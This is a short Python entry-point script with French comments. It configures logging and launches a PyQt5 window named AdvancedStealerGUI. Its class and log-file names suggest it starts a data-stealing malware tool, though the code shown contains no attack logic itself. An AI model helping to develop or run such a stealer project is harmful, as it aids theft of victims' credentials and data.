#!/usr/bin/env python3
# main.py - Point d'entrée principal

import sys
import os
import logging

from PyQt5.QtWidgets import QApplication
from gui.ui.main_window import AdvancedStealerGUI

# Configure le logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("advanced_stealer.log"),
        logging.StreamHandler()
    ]
)

def main():
    # Ajoute le dossier racine au PYTHONPATH pour que les imports fonctionnent partout
    sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
    
    app = QApplication(sys.argv)
    try:
        window = AdvancedStealerGUI()
        window.show()
        return app.exec_()
    except Exception as e:
        logging.critical(f"Erreur lors du lancement : {str(e)}", exc_info=True)
        return 1

if __name__ == "__main__":
    sys.exit(main())
